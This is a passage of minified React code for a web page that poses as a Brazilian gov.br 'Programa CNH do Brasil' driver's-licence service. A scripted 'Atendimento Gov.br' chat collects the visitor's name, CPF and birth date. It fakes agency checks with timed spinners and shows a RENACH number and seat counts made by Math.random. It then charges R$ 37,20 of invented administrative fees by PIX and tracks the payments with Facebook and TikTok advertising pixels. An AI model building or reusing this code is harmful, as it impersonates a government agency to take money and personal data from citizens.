              children: "Parabéns! Seu cadastro no Programa CNH do Brasil foi finalizado com sucesso."
            })]
          }), l.jsxs("div", {
            className: "bg-[#1351B4] text-white p-6 rounded-lg mb-6",
            children: [l.jsxs("div", {
              className: "flex items-center justify-center gap-3 mb-4",
              children: [l.jsx(AC, {
                className: "h-8 w-8"
              }), l.jsx("h2", {
                className: "text-xl font-bold",
                children: "Programa CNH do Brasil"
              })]
            }), l.jsxs("div", {
              className: "text-center",
              children: [l.jsx("p", {
                className: "text-sm opacity-90 mb-1",
                children: "Número do Protocolo:"
              }), l.jsx("p", {
                className: "text-2xl font-mono font-bold tracking-wider",
                children: n
              })]
            })]
          }), l.jsxs("div", {
            className: "bg-gray-50 p-6 rounded-lg mb-6",
            children: [l.jsx("h3", {
              className: "font-semibold text-gray-900 mb-4 text-center",
              children: "Dados do Cadastro"
            }), l.jsxs("div", {
              className: "space-y-3",
              children: [l.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [l.jsx("span", {
                  className: "text-gray-600",
                  children: "Nome:"
                }), l.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: e ? ME(e.nome) : "-"
                })]
              }), l.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [l.jsx("span", {
                  className: "text-gray-600",
                  children: "CPF:"
                }), l.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: e ? _E(e.cpf) : "-"
                })]
              }), l.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [l.jsx("span", {
                  className: "text-gray-600",
                  children: "Data de Nascimento:"
                }), l.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: (e == null ? void 0 : e.data_nascimento) || "-"
                })]
              }), l.jsxs("div", {
                className: "flex justify-between border-b pb-2",
                children: [l.jsx("span", {
                  className: "text-gray-600",
                  children: "Data do Cadastro:"
                }), l.jsx("span", {
                  className: "font-medium text-gray-900",
                  children: r
                })]
              }), l.jsxs("div", {
                className: "flex justify-between",
                children: [l.jsx("span", {
                  className: "text-gray-600",
                  children: "Status:"
                }), l.jsx("span", {
                  className: "font-medium text-green-600",
                  children: "Ativo"
                })]
              })]
            })]
          }), l.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [l.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2",
              children: "Próximos Passos:"
            }), l.jsxs("ul", {
              className: "text-sm text-blue-800 space-y-2",
              children: [l.jsx("li", {
                children: "• Aguarde a confirmação por e-mail em até 48 horas"
              }), l.jsx("li", {
                children: "• Você receberá instruções para agendar suas aulas"
              }), l.jsx("li", {
                children: "• Compareça ao DETRAN mais próximo com seus documentos"
              }), l.jsx("li", {
                children: "• Guarde seu número de protocolo para consultas"
              })]
            })]
          }), l.jsxs("div", {
            className: "flex gap-3",
            children: [l.jsxs(jn, {
              onClick: () => window.print(),
              variant: "outline",
              className: "flex-1 flex items-center justify-center gap-2",
              children: [l.jsx(jC, {
                className: "h-4 w-4"
              }), "Salvar Comprovante"]
            }), l.jsx(jn, {
              onClick: () => window.location.href = "/",
              className: "flex-1 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
              children: "Voltar ao Início"
            })]
          }), l.jsx("div", {
            className: "mt-6 pt-4 border-t text-center",
            children: l.jsx("p", {
              className: "text-xs text-gray-500",
              children: "Em caso de dúvidas, entre em contato através do portal gov.br"
            })
          })]
        })
      })
    })]
  })
}
let kg = !1;

function LE() {
  try {
    if (kg) return;
    kg = !0;
    const e = window,
      t = "D5E1SGRC77U40DIQKK20";
    if (!e.ttq) {
      e.TiktokAnalyticsObject = "ttq";
      const r = e.ttq = e.ttq || [];
      r.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], r.setAndDefer = function (s, o) {
        s[o] = function () {
          s.push([o].concat(Array.prototype.slice.call(arguments, 0)))
        }
      };
      for (let s = 0; s < r.methods.length; s++) r.setAndDefer(r, r.methods[s]);
      r.instance = function (s) {
        const o = r._i[s] || [];
        for (let i = 0; i < r.methods.length; i++) r.setAndDefer(o, r.methods[i]);
        return o
      }, r.load = function (s, o) {
        const i = "https://analytics.tiktok.com/i18n/pixel/events.js";
        r._i = r._i || {}, r._i[s] = [], r._i[s]._u = i, r._t = r._t || {}, r._t[s] = +new Date, r._o = r._o || {}, r._o[s] = o || {};
        const a = document.createElement("script");
        a.type = "text/javascript", a.async = !0, a.src = i + "?sdkid=" + s + "&lib=ttq";
        const c = document.getElementsByTagName("script")[0];
        c && c.parentNode && c.parentNode.insertBefore(a, c)
      }
    }
    const n = e.ttq;
    if (n && n.load && n.instance) {
      (!n._i || !n._i[t]) && n.load(t);
      const r = n.instance(t);
      r && r.track && (r.track("CompleteRegistration"), console.log("TikTok CompleteRegistration fired for pixel:", t))
    }
  } catch (e) {
    console.error("TikTok Pixel error:", e)
  }
}
const Rg = {
  AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
  AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
  AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
  BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
  CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
  DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
  ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
  GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
  MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
  MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
  MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
  MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
  PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
  PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
  PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
  PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
  RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
  RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
  RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
  RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
  SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
  SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
  SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg"
};

function OE() {
  var Ch;
  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "Cidadão", Te = () => ["MAIO", "JUNHO", "JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
    month: `${W}/2026`,
    vagas: Math.floor(Math.random() * 9) + 4
  })), ke = () => {
    let B = "";
    for (let W = 0; W < 11; W++) B += Math.floor(Math.random() * 10).toString();
    return B
  }, fn = () => {
    const B = new Date().getFullYear(),
      W = Math.floor(Math.random() * 9e8) + 1e8;
    return `${B}${W}`
  }, Di = x.useCallback(async B => {
    try {
      const Y = await (await fetch(`/api/check-payment?id=${B}`)).json();
      if (Y.success && Y.status) {
        if (I(Y.status), Y.status === "paid") {
          if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), typeof window < "u" && window.fbq) {
            const ge = window.fbq;
            ge("track", "Purchase", {
              value: (m == null ? void 0 : m.amount) || 37.20,
              currency: "BRL",
              content_type: "product",
              content_ids: [B],
              transaction_id: (m == null ? void 0 : m.transaction_id) || B
            })
          }
          return setTimeout(() => {
            e("/success")
          }, 1e3), !0
        } else if (Y.status === "expired" || Y.status === "cancelled") return console.log("Transação expirada ou cancelada"), !0
      }
      return !1
    } catch (W) {
      return console.error("Erro ao verificar status:", W), !1
    }
  }, [m, e]), oo = async () => {
    if (m != null && m.deposit_id) {
      ro(!0);
      try {
        const W = await (await fetch(`/api/check-payment?id=${m.deposit_id}`)).json();
        if (W.success && W.status === "paid") {
          if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), typeof window < "u" && window.fbq) {
            const Y = window.fbq;
            Y("track", "Purchase", {
              value: (m == null ? void 0 : m.amount) || 37.20,
              currency: "BRL",
              content_type: "product",
              content_ids: [m.deposit_id],
              transaction_id: (m == null ? void 0 : m.transaction_id) || m.deposit_id
            })
          }
          e("/success")
        } else ro(!1), ki(!0), v.current && setTimeout(() => {
          v.current && (v.current.scrollTop = v.current.scrollHeight)
        }, 100)
      } catch (B) {
        console.error("Erro ao verificar pagamento:", B), ro(!1), ki(!0), v.current && setTimeout(() => {
          v.current && (v.current.scrollTop = v.current.scrollHeight)
        }, 100)
      }
    }
  }, io = B => {
    var Y;
    const W = (Y = B.target.files) == null ? void 0 : Y[0];
    W && Ri(W)
  }, Xl = () => {
    var B;
    (B = Yl.current) == null || B.click()
  }, Mi = async () => {
    if (!br) return;
    ro(!0);
    try {
      const transactionId = m?.transaction_id || m?.deposit_id || localStorage.getItem("currentTransactionId");
      if (!transactionId) {
        alert("ID da transação não encontrado. Recarregue a página.");
        ro(!1);
        return;
      }
      
      const formData = new FormData();
      formData.append("comprovante", br);
      formData.append("transaction_id", transactionId);
      formData.append("customer_name", f?.nome || "");
      formData.append("customer_cpf", f?.cpf || "");
      formData.append("customer_email", f?.email || "");
      
      const response = await fetch("/api/comprovantes/upload.php", {
        method: "POST",
        body: formData
      });
      
      const result = await response.json();
      
      if (result.success) {
        e("/success");
      } else {
        alert("Erro ao enviar comprovante: " + (result.error || "Erro desconhecido"));
        ro(!1);
      }
    } catch (error) {
      console.error("Erro ao enviar comprovante:", error);
      alert("Erro ao enviar comprovante. Tente novamente.");
      ro(!1);
    }
  };
  x.useEffect(() => {
    if (!(m != null && m.deposit_id)) return;
    console.log("Starting payment status polling with deposit_id:", m.deposit_id);
    const B = setInterval(async () => {
      try {
        await Di(m.deposit_id) && clearInterval(B)
      } catch (W) {
        console.error("Polling error:", W)
      }
    }, 3e3);
    return () => clearInterval(B)
  }, [m == null ? void 0 : m.deposit_id, Di]), x.useEffect(() => {
    if (o !== "awaiting_payment" || $ <= 0) return;
    const B = setInterval(() => {
      U(W => W <= 1 ? (clearInterval(B), 0) : W - 1)
    }, 1e3);
    return () => clearInterval(B)
  }, [o, $]);
  const Jl = B => {
    const W = Math.floor(B / 60),
      Y = B % 60;
    return `${String(W).padStart(2, "0")}:${String(Y).padStart(2, "0")}`
  };

  function _i(B) {
    return B ? B.toLowerCase().split(" ").map(W => W.charAt(0).toUpperCase() + W.slice(1)).join(" ") : ""
  }
  const Zl = B => B.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  x.useEffect(() => {
    const B = localStorage.getItem("userData"),
      W = localStorage.getItem("selectedDetran");
    if (B) {
      const ge = JSON.parse(B);
      h(ge), ge.nome && p(ge.nome.split(" ")[0])
    }
    W && w(JSON.parse(W)), _(ke()), L(Te()), to(fn());
    const Y = "fb_addtocart_chat_tracked";
    if (!localStorage.getItem(Y) && typeof window.fbq < "u") try {
      window.fbq("track", "AddToCart", {
        value: 37.20,
        currency: "BRL",
        content_name: "Taxa DETRAN - CNH do Brasil",
        content_type: "product"
      }), localStorage.setItem(Y, new Date().toISOString())
    } catch (ge) {
      console.error("Facebook Pixel AddToCart error:", ge)
    }
    LE()
  }, []), x.useEffect(() => {
    if (v.current) {
      if (o === "pix_document" || o === "awaiting_payment") return;
      v.current.scrollTop = v.current.scrollHeight
    }
  }, [t, r, o, m, X, J, ze]);
  const Ln = (B, W) => {
    n(Y => [...Y, {
      text: B,
      isIncoming: W
    }])
  },
    Ii = async (B, W = 4e3) => {
      s(!0), await new Promise(Y => setTimeout(Y, W)), s(!1), Ln(B, !0)
    }, Li = async (B = 0) => {
      j(!0), re(null);
      const W = 3;
      try {
        const Y = localStorage.getItem("userData");
        if (!Y) return re("Dados do usuário não encontrados. Recarregue a página."), j(!1), !1;
        const ge = JSON.parse(Y);
        console.log(`Creating PIX transaction for: ${ge.nome} (attempt ${B + 1}/${W})`);
        const qr = await (await fetch("/api/pix", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            amount: 37.20,
            customer_name: ge.nome,
            customer_email: ge.email || "cliente@email.com",
            customer_phone: ge.phone || "11999999999",
            customer_cpf: ge.cpf,
            detran_uf: (y == null ? void 0 : y.uf) || "",
            detran_nome: (y == null ? void 0 : y.nome) || ""
          })
        })).json();
        return qr.success && qr.pix_code ? (b(qr), U(600), localStorage.setItem("currentTransactionId", qr.transaction_id), localStorage.setItem("currentDepositId", qr.deposit_id), j(!1), !0) : B < W - 1 ? (await new Promise(bw => setTimeout(bw, 2e3)), Li(B + 1)) : (re(qr.error || "Erro ao gerar código PIX. Tente novamente."), j(!1), !1)
      } catch {
        return B < W - 1 ? (await new Promise(ge => setTimeout(ge, 2e3)), Li(B + 1)) : (re("Erro de conexão. Verifique sua internet e tente novamente."), j(!1), !1)
      }
    }, dw = async () => {
      m != null && m.pix_code && (await navigator.clipboard.writeText(m.pix_code), P(!0), setTimeout(() => P(!1), 3e3))
    }, fw = async () => {
      S.current || (S.current = !0, Ln("Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que é necessário selecionar a categoria de CNH pretendida.", !0), i("category_selection"))
    }, ec = async B => {
      c(B), Ln(`Categoria ${B}`, !1), i("consulting_vagas"), oe(!0), await new Promise(W => setTimeout(W, 4e3)), oe(!1), await Ii(`Prezado(a) ${Z}, informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.

Após a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.`, 6e3), i("msg1_continue")
    }, hw = async () => {
      Ln("Prosseguir", !1), i("msg1_sent"), await Ii(`O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"} disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.`, 7e3), i("msg2_continue")
    }, mw = async () => {
      Ln("Prosseguir", !1), i("msg2_sent"), await Ii("As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.", 7e3), i("msg3_continue")
    }, pw = async () => {
      Ln("Prosseguir", !1), i("msg3_sent"), await Ii("Selecione o mês de sua preferência para realização das avaliações:", 3e3), i("month_selection")
    }, gw = async B => {
      if (d(B), Ln(B, !1), i("confirming_cadastro"), Ue(!0), Je("Confirmando cadastro junto ao Detran..."), await new Promise(W => setTimeout(W, 3e3)), Je("Gerando cadastro no RENACH..."), await new Promise(W => setTimeout(W, 2500)), Je("Emitindo documentação..."), await new Promise(W => setTimeout(W, 2500)), Ue(!1), Ln(`Prezado(a) ${Z}, seu número de RENACH foi gerado com sucesso junto ao Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"}.

Número do RENACH: **${M}**

O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identificação único do candidato no Sistema Nacional de Habilitação.`, !0), await new Promise(W => setTimeout(W, 300)), v.current) {
        const W = v.current.scrollHeight;
        v.current.scrollTop = W - 600
      }
      D(!0), i("renach_continue")
    }, tc = (B, W) => {
      wh(Y => [...Y, {
        text: B,
        isIncoming: W
      }]), setTimeout(() => {
        v.current && (v.current.scrollTop = v.current.scrollHeight)
      }, 100)
    }, yw = (B, W) => {
      z(Y => [...Y, {
        text: B,
        isIncoming: W
      }])
    }, vw = async (B, W = 2e3) => {
      E(!0), v.current && (v.current.scrollTop = v.current.scrollHeight), await new Promise(Y => setTimeout(Y, W)), E(!1), tc(B, !0)
    }, xw = async () => {
      tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:

• Taxa de Expedição de Documento (TED): R$ 11,95
• Taxa de Serviços Administrativos (TSA): R$ 13,40
• Taxa de Processamento Eletrônico (TPE): R$ 11,85

Valor Total: R$ 37,20`, 3e3), i("finalize_button")
    }, ww = async () => {
      tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
      const B = setTimeout(() => {
        Q("Aguarde e não feche a página. Sua guia de pagamento está sendo gerada...")
      }, 5e3),
        W = setTimeout(() => {
          Q("Por favor, aguarde mais um momento. Estamos finalizando a geração da sua guia...")
        }, 15e3);
      await Li(), clearTimeout(B), clearTimeout(W), Q(""), await new Promise(Y => setTimeout(Y, 1500)), i("pix_document"), setTimeout(() => {
        if (V.current && v.current) {
          const Y = V.current.offsetTop;
          v.current.scrollTop = Y - 8
        }
      }, 150), await new Promise(Y => setTimeout(Y, 2e3)), yw(`Para realizar o pagamento via PIX Copia e Cola:

1. Copie o código PIX clicando no botão "Copiar Código PIX"
2. Abra o aplicativo do seu banco
3. Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"
4. Cole o código copiado e confirme o pagamento

Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.

Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
    };
  x.useEffect(() => {
    f && y && fw()
  }, [f, y]);
  const Gr = new Date,
    nc = `${Gr.getDate().toString().padStart(2, "0")}/${(Gr.getMonth() + 1).toString().padStart(2, "0")}/${Gr.getFullYear()}`,
    bh = `${Gr.getHours().toString().padStart(2, "0")}:${Gr.getMinutes().toString().padStart(2, "0")}`,
    Sh = nc,
    Oi = ({
      onClick: B
    }) => l.jsx("div", {
      className: "flex flex-col gap-3 max-w-[80%] mt-4",
      children: l.jsxs("button", {
        onClick: B,
        className: "flex items-center justify-center gap-2 p-3 bg-[#1351B4] text-white rounded-sm shadow-md hover:bg-[#0D3A8C] transition-all",
        children: [l.jsx("span", {
          className: "font-medium text-sm",
          children: "Prosseguir"
        }), l.jsx(SC, {
          className: "w-4 h-4"
        })]
      })
    });
  return l.jsxs("div", {
    className: "min-h-screen bg-white flex flex-col",
    children: [l.jsxs("header", {
      style: {
        backgroundColor: "white",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsx("img", {
          src: "https://i.ibb.co/zPFChvR/logo645.png",
          alt: "Logo gov.br estilizada com texto em azul e amarelo",
          style: {
            marginRight: "32px",
            background: "none",
            boxShadow: "none"
          },
          width: "70",
          height: "24"
        }), l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            fontSize: "14px",
            marginLeft: "32px",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          "aria-label": "Menu de links",
          children: l.jsx("i", {
            className: "fas fa-ellipsis-v",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsx("div", {
          style: {
            borderLeft: "1px solid #ccc",
            height: "24px",
            margin: "0 16px",
            background: "none",
            boxShadow: "none"
          }
        })]
      }), l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          children: l.jsx("i", {
            className: "fas fa-cookie-bite",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          type: "button",
          "aria-label": "Sistemas",
          children: l.jsx("i", {
            className: "fas fa-th",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsxs("button", {
          style: {
            backgroundColor: "#1451B4",
            color: "white",
            border: "none",
            borderRadius: "9999px",
            padding: "6px 16px",
            display: "flex",
            alignItems: "center",
            fontSize: "14px",
            cursor: "pointer",
            marginLeft: "24px",
            boxShadow: "none"
          },
          type: "button",
          children: [l.jsx("i", {
            className: "fas fa-user",
            style: {
              color: "white",
              marginRight: "8px",
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          }), l.jsx("span", {
            children: g || "Entrar"
          })]
        })]
      })]
    }), l.jsx("nav", {
      style: {
        backgroundColor: "#f5f5f5",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsxs("div", {
          style: {
            position: "relative",
            marginRight: "10px"
          },
          children: [l.jsx("img", {
            src: "https://play-lh.googleusercontent.com/6-1IDYn9nr8LFgI6TtDYUEWczJTvPa0bWQnWG_jyBXe7GdKWQpKTkaiMA4WuQGvRv1pD",
            alt: "Atendimento",
            style: {
              width: "28px",
              height: "28px",
              borderRadius: "50%",
              objectFit: "cover"
            }
          }), l.jsx("span", {
            style: {
              position: "absolute",
              bottom: "0",
              right: "0",
              width: "8px",
              height: "8px",
              backgroundColor: "#22c55e",
              borderRadius: "50%",
              border: "2px solid white"
            }
          })]
        }), l.jsx("span", {
          style: {
            color: "#666",
            fontSize: "0.875rem",
            fontWeight: 300,
            lineHeight: "18px",
            background: "none",
            boxShadow: "none"
          },
          children: "Atendimento Gov.br"
        })]
      })
    }), l.jsx("main", {
      className: "flex-1 overflow-hidden bg-gray-50",
      children: l.jsx("div", {
        className: "max-w-4xl mx-auto h-full px-4",
        children: l.jsxs("div", {
          ref: v,
          className: "h-[calc(100vh-160px)] overflow-y-auto py-4",
          style: {
            scrollBehavior: "smooth"
          },
          children: [t.map((B, W) => l.jsx("div", {
            className: `mb-4 ${B.isIncoming ? "text-left" : "text-right"}`,
            children: l.jsx("div", {
              className: `inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base ${B.isIncoming ? "bg-[#2670CC] text-white rounded-tl-sm" : "bg-gray-200 text-gray-800 rounded-tr-sm"}`,
              style: {
                lineHeight: "1.5",
                fontSize: "16px",
                whiteSpace: "pre-line"
              },
              children: B.text.split("**").map((Y, ge) => ge % 2 === 1 ? l.jsx("strong", {
                children: Y
              }, ge) : Y)
            })
          }, W)), r && l.jsx("div", {
            className: "mb-4 text-left",
            children: l.jsx("div", {
              className: "inline-block bg-[#2670CC] text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm text-base",
              children: l.jsxs("div", {
                className: "flex items-center gap-1.5",
                children: [l.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "0ms"
                  }
                }), l.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "150ms"
                  }
                }), l.jsx("span", {
                  className: "w-2 h-2 bg-white rounded-full animate-bounce",
                  style: {
                    animationDelay: "300ms"
                  }
                })]
              })
            })
          }), o === "category_selection" && l.jsxs("div", {
            className: "flex flex-col gap-3 max-w-[80%] mt-2",
            children: [l.jsxs("button", {
              onClick: () => ec("A"),
              className: "flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left",
              children: [l.jsx("span", {
                className: "text-[#1351B4] text-xl font-bold",
                children: "A"
              }), l.jsx("span", {
                className: "font-medium text-gray-800",
                children: "Categoria A - Motocicletas"
              })]
            }), l.jsxs("button", {
              onClick: () => ec("B"),
              className: "flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left",
              children: [l.jsx("span", {
                className: "text-[#1351B4] text-xl font-bold",
                children: "B"
              }), l.jsx("span", {
                className: "font-medium text-gray-800",
                children: "Categoria B - Carros"
              })]
            }), l.jsxs("button", {
              onClick: () => ec("AB"),
              className: "flex items-center gap-3 p-4 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all text-left",
              children: [l.jsx("span", {
                className: "text-[#1351B4] text-xl font-bold",
                children: "AB"
              }), l.jsx("span", {
                className: "font-medium text-gray-800",
                children: "Categoria AB - Motocicletas e Carros"
              })]
            })]
          }), J && l.jsx("div", {
            className: "flex justify-center my-6",
            children: l.jsxs("div", {
              className: "bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm",
              children: [l.jsx(vt, {
                className: "w-5 h-5 animate-spin text-[#1351B4]"
              }), l.jsxs("span", {
                className: "text-gray-700",
                children: ["Consultando vagas no Detran ", (y == null ? void 0 : y.nome) || "do seu Estado", "..."]
              })]
            })
          }), o === "msg1_continue" && l.jsx(Oi, {
            onClick: hw
          }), o === "msg2_continue" && l.jsx(Oi, {
            onClick: mw
          }), o === "msg3_continue" && l.jsx(Oi, {
            onClick: pw
          }), o === "month_selection" && l.jsx("div", {
            className: "grid grid-cols-2 sm:grid-cols-3 gap-3 max-w-full mt-4",
            children: R.map(B => l.jsxs("button", {
              onClick: () => gw(B.month),
              className: "flex flex-col items-center p-3 bg-gradient-to-b from-gray-100 to-white border border-gray-300 rounded-sm shadow-md hover:shadow-lg hover:border-[#1351B4] transition-all",
              children: [l.jsx("span", {
                className: "font-medium text-gray-800 text-sm",
                children: B.month
              }), l.jsxs("span", {
                className: "text-xs text-[#1351B4] font-semibold mt-1",
                children: [B.vagas, " vagas"]
              })]
            }, B.month))
          }), ze && l.jsx("div", {
            className: "flex justify-center my-6",
            children: l.jsxs("div", {
              className: "bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm",
              children: [l.jsx(vt, {
                className: "w-5 h-5 animate-spin text-[#1351B4]"
              }), l.jsx("span", {
                className: "text-gray-700",
                children: wr
              })]
            })
          }), X && l.jsx("div", {
            className: "w-full mt-4 mb-4",
            children: l.jsxs("div", {
              className: "bg-white border border-gray-300 rounded shadow-md",
              style: {
                fontFamily: "Arial, sans-serif",
                fontSize: "12px"
              },
              children: [l.jsxs("div", {
                className: "bg-gray-50 p-2 border-b border-gray-200 flex items-center justify-between",
                children: [l.jsx("div", {
                  className: "flex items-center gap-2",
                  children: l.jsx("img", {
                    src: Rg[(y == null ? void 0 : y.uf) || ""] || "",
                    alt: `DETRAN ${(y == null ? void 0 : y.uf) || ""}`,
                    className: "h-8 max-w-[100px] object-contain"
                  })
                }), l.jsxs("span", {
                  className: "text-gray-500 text-xs",
                  children: ["Protocolo: ", dn]
                })]
              }), l.jsxs("div", {
                className: "p-3",
                children: [l.jsx("div", {
                  className: "text-center mb-2",
                  children: l.jsx("p", {
                    className: "text-xs font-bold text-gray-700",
                    children: "COMPROVANTE DE CADASTRO - RENACH"
                  })
                }), l.jsxs("div", {
